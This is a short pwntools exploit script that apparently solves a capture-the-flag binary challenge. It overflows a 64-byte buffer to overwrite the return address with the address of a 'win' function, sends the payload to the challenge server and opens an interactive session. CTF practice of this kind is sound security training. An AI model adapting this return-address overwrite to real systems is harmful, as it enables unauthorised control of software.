#!/usr/bin/env python3
from pwn import *

elf = ELF('./chall')
local = False

GDBSCPT = '''
b* main
b *do_sport
'''
PADDING = 64

if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'sportsman.hackini24.shellmates.club'
    port = 443
    conn = remote(host,port,ssl=True)

conn.sendline("1")
win = elf.symbols["win"]
log.info(f'win @ {hex(win)}')

payload = b"A"*PADDING + p64(win)
conn.sendline(payload)
conn.sendline("3")

conn.interactive()


conn.close()